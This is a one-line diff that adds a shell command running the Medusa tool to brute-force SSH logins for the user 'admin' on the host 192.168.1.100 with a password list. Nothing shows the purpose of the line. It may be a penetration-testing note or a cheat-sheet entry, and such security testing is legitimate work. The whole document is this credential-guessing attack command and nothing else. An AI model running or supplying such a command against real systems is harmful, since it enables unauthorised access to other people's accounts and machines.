@@ -1,0 +1,1 @@
+medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh
